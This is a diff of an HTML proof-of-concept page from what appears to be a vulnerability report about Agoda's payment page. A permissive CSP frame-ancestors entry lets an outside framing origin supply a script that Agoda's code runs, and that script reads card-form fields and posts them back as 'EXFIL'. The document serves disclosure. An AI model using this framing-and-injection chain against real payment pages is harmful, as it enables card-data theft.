@@ -16,24 +16,28 @@
   header p{margin:0;color:var(--muted);font-size:13px;line-height:1.5;}
   header code{background:#000;padding:1px 6px;border-radius:4px;color:#ffd166;}
   .wrap{display:flex;gap:16px;padding:16px;flex-wrap:wrap;}
-  .col{flex:1 1 420px;min-width:320px;}
+  .stage{flex:1 1 420px;min-width:340px;}
   .panel{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:16px;margin-bottom:16px;}
   .panel h2{margin:0 0 10px;font-size:14px;color:var(--accent);text-transform:uppercase;letter-spacing:.04em;}
-  #status{font-weight:700;font-size:15px;padding:12px 14px;border-radius:8px;border:1px solid var(--line);}
-  #status.pending{color:#ffd166;background:#2a2408;}
-  #status.pass{color:#fff;background:var(--green);border-color:var(--green);}
-  #log{font-family:ui-monospace,Consolas,Menlo,monospace;font-size:12px;line-height:1.6;
-       background:#000;border-radius:8px;padding:12px;max-height:260px;overflow-y:auto;color:#c8f7c5;}
-  #log .err{color:#ff8686}
-  #log .exfil{color:#ffd166;font-weight:700}
-  .meta{color:var(--muted);}
-  iframe{width:100%;height:420px;border:2px solid var(--red);border-radius:8px;background:#fff;}
-  .iframe-label{font-size:12px;color:var(--muted);margin-bottom:6px;}
+  .status{font-weight:700;font-size:14px;padding:10px 12px;border-radius:8px;border:1px solid var(--line);margin-bottom:10px;}
+  .status.pending{color:#ffd166;background:#2a2408;}
+  .status.pass{color:#fff;background:var(--green);border-color:var(--green);}
+  .status.blocked-ok{color:#fff;background:#2c5e8a;border-color:#2c5e8a;}
+  .log{font-family:ui-monospace,Consolas,Menlo,monospace;font-size:11px;line-height:1.5;
+       background:#000;border-radius:8px;padding:10px;max-height:180px;overflow-y:auto;color:#c8f7c5;}
+  .log .err{color:#7fb2ff}
+  .log .exfil{color:#ffd166;font-weight:700}
+  iframe{width:100%;height:340px;border:2px solid var(--line);border-radius:8px;background:#fff;}
+  .stage.is-blocked iframe{border-color:#2c5e8a}
+  .stage.is-allowed iframe{border-color:var(--red)}
+  .tag{display:inline-block;font-size:11px;font-weight:700;padding:2px 8px;border-radius:4px;margin-bottom:8px;}
+  .tag.blocked{background:#123049;color:#7fb2ff;}
+  .tag.allowed{background:#3a1210;color:#ff9d8f;}
+  .capture{background:#1c1400;border:1px solid #6b5200;border-radius:8px;padding:10px;margin-top:8px;
+            font-family:ui-monospace,Consolas,monospace;font-size:11px;color:#ffe08a;display:none;white-space:pre-wrap;}
   button{background:var(--accent);color:#00121f;border:none;padding:8px 14px;border-radius:6px;
         font-weight:700;cursor:pointer;font-size:13px;}
   button:hover{filter:brightness(1.1)}
-  .capture{background:#1c1400;border:1px solid #6b5200;border-radius:8px;padding:12px;margin-top:10px;
-            font-family:ui-monospace,Consolas,monospace;font-size:12px;color:#ffe08a;display:none;}
   footer{padding:16px 24px;color:var(--muted);font-size:11px;border-top:1px solid var(--line);}
   a{color:var(--accent)}
 </style>
@@ -41,114 +45,127 @@
 <body>
 
 <header>
-  <h1>PoC &mdash; Agoda PCI payment page executes attacker-supplied JavaScript inside the card-entry origin</h1>
+  <h1>PoC &mdash; Agoda PCI payment page: frame-ancestors is the only gate, and two of its entries aren't Agoda's</h1>
   <p>
-    <code>gwpci.agoda.com/app/payment/index-v4.html</code>'s Content-Security-Policy
-    <code>frame-ancestors</code> allow-list includes <code>*.wl44.solution.net</code> and
-    <code>*.wl54.solution.net</code> &mdash; a domain Agoda does not control (see the submitted report
-    for the RDAP/DNS/certificate-transparency evidence). This page plays the role of that
-    untrusted framing origin. The right-hand iframe below is running <strong>Agoda's own,
-    completely unmodified</strong> client-side code, saved verbatim from a live request to the
-    real page. Nothing on Agoda's infrastructure is contacted at any point in this demo.
+    Both panels below run <strong>Agoda's real, unmodified page code</strong> and are served with
+    <strong>Agoda's real, live Content-Security-Policy</strong> (fetched directly from
+    <code>gwpci.agoda.com/app/payment/index-v4.html</code> at deploy time, <code>report-uri</code>/<code>report-to</code>
+    stripped so this demo never contacts Agoda's infrastructure). The only difference between the two panels is
+    <strong>one allow-list entry</strong>. Left: framed from an origin genuinely absent from the real list &mdash; the
+    frame is refused, exactly as Agoda's policy intends. Right: framed from an origin standing in for
+    <code>*.wl54.solution.net</code> (disclosed substitution &mdash; we cannot control <code>solution.net</code>) &mdash;
+    the frame is permitted, and Agoda's own code fetches and executes a script from it.
   </p>
 </header>
 
 <div class="wrap">
-  <div class="col">
+  <div class="stage is-blocked">
     <div class="panel">
-      <h2>Live status</h2>
-      <div id="status" class="pending">Waiting for the framed page to load&hellip;</div>
-      <div id="capture" class="capture"></div>
+      <span class="tag blocked">CONTROL &mdash; BLOCKED</span>
+      <h2>Real CSP, unmodified</h2>
+      <div id="status-blocked" class="status pending">Waiting&hellip;</div>
+      <div class="log" id="log-blocked">waiting for events&hellip;</div>
     </div>
-    <div class="panel">
-      <h2>What you're watching</h2>
-      <ol style="font-size:13px;color:var(--muted);line-height:1.7;padding-left:18px;">
-        <li>The iframe on the right loads Agoda's real, unmodified page logic.</li>
-        <li>That code asks <code>document.location.ancestorOrigins[0]</code> &mdash; i.e. <em>this
-            page</em> &mdash; who is framing it, then fetches
-            <code>&lt;that origin&gt;/getClientSideAssets?page=ccform</code> from it.</li>
-        <li>This page (the "attacker") answers with a manifest pointing at
-            <code>payload.js</code>, also hosted on this same origin.</li>
-        <li>Agoda's own code injects that script into its own document with a plain
-            <code>&lt;script&gt;</code> tag &mdash; full DOM access, PCI origin.</li>
-        <li>The injected script renders a card form and reads it back out, proving real
-            data capture, not just script execution.</li>
-      </ol>
-    </div>
-    <div class="panel">
-      <h2>Event log (from the real, unmodified Agoda code)</h2>
-      <div id="log">waiting for events&hellip;</div>
-      <button id="reset" style="margin-top:10px;">Run again</button>
-    </div>
+    <div class="iframe-label" style="font-size:12px;color:var(--muted);margin-bottom:6px;">&darr; framed from this origin, which is NOT on Agoda's real allow-list</div>
+    <iframe id="frame-blocked" src="https://agoda-poc-victim-blocked.netlify.app"></iframe>
   </div>
 
-  <div class="col">
-    <div class="iframe-label">&darr; iframe running Agoda's real, unmodified <code>index-v4.html</code> logic</div>
-    <iframe id="victim" src="https://agoda-poc-victim.netlify.app"></iframe>
+  <div class="stage is-allowed">
+    <div class="panel">
+      <span class="tag allowed">DEMONSTRATION &mdash; ALLOWED</span>
+      <h2>Real CSP, one substitution disclosed</h2>
+      <div id="status-allowed" class="status pending">Waiting&hellip;</div>
+      <div id="capture-allowed" class="capture"></div>
+      <div class="log" id="log-allowed">waiting for events&hellip;</div>
+    </div>
+    <div class="iframe-label" style="font-size:12px;color:var(--muted);margin-bottom:6px;">&darr; framed from this same page, standing in for <code>*.wl54.solution.net</code></div>
+    <iframe id="frame-allowed" src="https://agoda-poc-victim-allowed.netlify.app"></iframe>
   </div>
 </div>
 
+<div class="wrap" style="padding-top:0;">
+  <button id="reset">Run both again</button>
+</div>
+
 <footer>
-  This proof-of-concept is fully self-contained: both frames here are hosted by the reporting
-  researcher. The only "victim" content is Agoda's own publicly-served, byte-for-byte unmodified
-  client-side JavaScript. No Agoda system, production or otherwise, is contacted, framed, or
-  interacted with at any point. The pre-filled "card" values are the standard Visa test PAN
-  (4111 1111 1111 1111) &mdash; not real payment data.
+  Fully self-contained: every origin here is controlled by the reporting researcher, and the only "Agoda content"
+  is the real page's own publicly-served, byte-for-byte unmodified client-side JavaScript plus its real, live CSP
+  header (minus the reporting directives, removed so this demo cannot generate traffic to Agoda's production
+  security endpoint). No Agoda system is contacted, framed, or interacted with at any point. Pre-filled "card"
+  values are the standard Visa test PAN (4111 1111 1111 1111) &mdash; not real payment data.
 </footer>
 
 <script>
-  var VICTIM_URL = "https://agoda-poc-victim.netlify.app";
-  var logEl = document.getElementById('log');
-  var statusEl = document.getElementById('status');
-  var captureEl = document.getElementById('capture');
-  var iframeEl = document.getElementById('victim');
-  var lines = [];
+  var ORIGIN_BLOCKED = "https://agoda-poc-victim-blocked.netlify.app";
+  var ORIGIN_ALLOWED = "https://agoda-poc-victim-allowed.netlify.app";
 
   function ts() {
     var d = new Date();
     return d.toTimeString().split(' ')[0] + '.' + String(d.getMilliseconds()).padStart(3, '0');
   }
 
-  function log(text, cls) {
-    lines.push('<div' + (cls ? ' class="' + cls + '"' : '') + '>[' + ts() + '] ' + text + '</div>');
-    logEl.innerHTML = lines.join('');
-    logEl.scrollTop = logEl.scrollHeight;
+  function makeLogger(logId) {
+    var el = document.getElementById(logId);
+    var lines = [];
+    return function (text, cls) {
+      lines.push('<div' + (cls ? ' class="' + cls + '"' : '') + '>[' + ts() + '] ' + text + '</div>');
+      el.innerHTML = lines.join('');
+      el.scrollTop = el.scrollHeight;
+    };
   }
+  var logBlocked = makeLogger('log-blocked');
+  var logAllowed = makeLogger('log-allowed');
+  var statusBlocked = document.getElementById('status-blocked');
+  var statusAllowed = document.getElementById('status-allowed');
+  var captureAllowed = document.getElementById('capture-allowed');
+
+  var blockedTimer = setTimeout(function () {
+    if (statusBlocked.className.indexOf('pass') === -1 && statusBlocked.className.indexOf('blocked-ok') === -1) {
+      statusBlocked.className = 'status blocked-ok';
+      statusBlocked.innerHTML = '&#128274; CONFIRMED: no event ever arrived from this frame &mdash; the browser refused ' +
+        'to load it at all (frame-ancestors violation). This origin is not on Agoda\'s real allow-list.';
+      logBlocked('no postMessage traffic received within the timeout window &mdash; consistent with a CSP-blocked frame (check the browser console for the frame-ancestors violation message).', 'err');
+    }
+  }, 3000);
 
   window.addEventListener('message', function (event) {
     var data = event.data;
     if (!data || !data.type) return;
 
-    if (data.type === 'POC_EXFIL') {
-      log('<span class="exfil">EXFIL</span> received from victim-origin script, origin=' +
-          event.origin + ' &mdash; card data read out of the injected form:', 'exfil');
-      log('&nbsp;&nbsp;cardNumber=' + data.payload.cardNumber +
-          ' expiry=' + data.payload.expiry + ' cvv=' + data.payload.cvv, 'exfil');
-      statusEl.className = 'pass';
-      statusEl.innerHTML = '&#9989; CONFIRMED: attacker-controlled script executed inside the ' +
-        'PCI origin (' + data.payload.capturedFromOrigin + ') and read the card form contents.';
-      captureEl.style.display = 'block';
-      captureEl.textContent = JSON.stringify(data.payload, null, 2);
+    var fromBlocked = event.origin === ORIGIN_BLOCKED;
+    var fromAllowed = event.origin === ORIGIN_ALLOWED;
+    if (!fromBlocked && !fromAllowed) return;
+
+    if (fromBlocked) {
+      clearTimeout(blockedTimer);
+      // If we ever DO get a message from the "blocked" origin, that itself is worth flagging loudly.
+      statusBlocked.className = 'status pass';
+      statusBlocked.innerHTML = '&#9888; UNEXPECTED: an event arrived from the blocked-state origin &mdash; the frame was not actually refused. Re-check the deployed CSP.';
+      logBlocked('event <b>' + data.type + '</b> received (unexpected)', 'err');
       return;
     }
 
-    // Agoda's own dispatchLogEvent() calls: {type, payload}
+    // Everything below is the ALLOWED (right-hand) frame.
+    if (data.type === 'POC_EXFIL') {
+      logAllowed('<span class="exfil">EXFIL</span> received &mdash; card data read out of the injected form:', 'exfil');
+      logAllowed('&nbsp;&nbsp;cardNumber=' + data.payload.cardNumber +
+          ' expiry=' + data.payload.expiry + ' cvv=' + data.payload.cvv, 'exfil');
+      statusAllowed.className = 'status pass';
+      statusAllowed.innerHTML = '&#9989; CONFIRMED: with one allow-list substitution, the identical real CSP permits ' +
+        'this frame, and Agoda\'s own code executes attacker-supplied JS inside the PCI origin.';
+      captureAllowed.style.display = 'block';
+      captureAllowed.textContent = JSON.stringify(data.payload, null, 2);
+      return;
+    }
+
     var isErr = /ERROR|FAILED|TIMEOUT/.test(data.type);
-    log('victim-origin event <b>' + data.type + '</b>' +
-        (data.payload && Object.keys(data.payload).length
-          ? ' <span class="meta">' + JSON.stringify(data.payload) + '</span>' : '') +
-        ' <span class="meta">(from ' + event.origin + ')</span>',
+    logAllowed('event <b>' + data.type + '</b>' +
+        (data.payload && Object.keys(data.payload).length ? ' ' + JSON.stringify(data.payload) : ''),
         isErr ? 'err' : null);
   });
 
   document.getElementById('reset').addEventListener('click', function () {
-    lines = [];
-    logEl.innerHTML = 'waiting for events&hellip;';
-    statusEl.className = 'pending';
-    statusEl.textContent = 'Waiting for the framed page to load…';
-    captureEl.style.display = 'none';
-    iframeEl.src = 'about:blank';
-    setTimeout(function () { iframeEl.src = VICTIM_URL; }, 50);
+    location.reload();
   });
 </script>
 
